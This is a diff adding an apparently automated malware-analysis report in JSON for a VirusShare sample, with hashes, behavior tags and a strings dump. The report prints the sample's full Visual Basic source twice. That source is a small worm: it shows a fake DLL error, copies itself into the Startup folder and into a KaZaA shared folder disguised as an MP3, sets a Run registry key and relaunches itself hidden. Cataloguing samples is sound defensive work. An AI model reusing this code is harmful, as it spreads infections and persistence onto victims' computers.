@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "CreateObject": "May create an OLE object",
+            "FileCopy": "May copy a file",
+            "Open": "May open a file",
+            "Output": "May write to a file",
+            "RUN": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WINDOWS": "May enumerate application windows",
+            "vbHide": "May run an executable file or a system command",
+            "wscript.shell": "May run an executable file or a system command"
+        },
+        "macro": "Private Sub Form_Unload(Cancel As Integer)\n  Shell App.Path & \"\\\" & App.EXEName & \".exe\"\n  Open \"C:\\file.sys\" For Output As #1\n  End Sub\nPrivate Sub form_load()\n  Form1 Visible = False\n  MsgBox \"Cannot find vbflash32.dll, program disrupted\", 16, \"error\"\n  FileCopy App.Path & \"\\\" & App.EXEName & \".exe\", \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\BrainwashBrainwashBrainwash45.exe\"\n  FileCopy App.Path + \"\\\" & App.EXEName & \".exe\", \"C:\\Program Files\\KaZaA\\My shared folder\\The White Stripes - IM INFECTED.mp3\"\n   strFile = App.Path & \"\\\" & App.EXEName & \".exe\"\n   If Command() = vbNullString Then\n       FileCopy strFile, strNewFile\n       WriteToRegistry\n       Shell strNewFile & \" \\brainwash29\", vbHide\n       End If\n       End Sub\n       Private Sub WriteToRegistry()\n   Dim objReg As Object\n   Set objReg = CreateObject(\"wscript.shell\")\n   objReg.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\\" & strProjectName, strNewFile & \" \\brainwash29\"\n   End Sub"
+    },
+    "filename": "VirusShare_2cb08fe137e2fad9bbe835d82cba1a78",
+    "filesize": 1028,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2cb08fe137e2fad9bbe835d82cba1a78",
+        "sha1": "fc93de922c3123b1be92e8b8e19d2d5185530c34",
+        "sha256": "c5ca2d2b4cd5bcabfb7df60b1f3ccfc0ab55f8cf1151c1fada3b77ba2e9b906f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Private Sub Form_Unload(Cancel As Integer)",
+            "  Shell App.Path & \"\\\" & App.EXEName & \".exe\"",
+            "  Open \"C:\\file.sys\" For Output As #1",
+            "  End Sub",
+            "Private Sub form_load()",
+            "  Form1 Visible = False",
+            "  MsgBox \"Cannot find vbflash32.dll, program disrupted\", 16, \"error\"",
+            "  FileCopy App.Path & \"\\\" & App.EXEName & \".exe\", \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\BrainwashBrainwashBrainwash45.exe\"",
+            "  FileCopy App.Path + \"\\\" & App.EXEName & \".exe\", \"C:\\Program Files\\KaZaA\\My shared folder\\The White Stripes - IM INFECTED.mp3\"",
+            "   strFile = App.Path & \"\\\" & App.EXEName & \".exe\"",
+            "   If Command() = vbNullString Then",
+            "       FileCopy strFile, strNewFile",
+            "       WriteToRegistry",
+            "       Shell strNewFile & \" \\brainwash29\", vbHide",
+            "       End If",
+            "       End Sub",
+            "       Private Sub WriteToRegistry()",
+            "   Dim objReg As Object",
+            "   Set objReg = CreateObject(\"wscript.shell\")",
+            "   objReg.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\\" & strProjectName, strNewFile & \" \\brainwash29\"",
+            "   End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261881",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
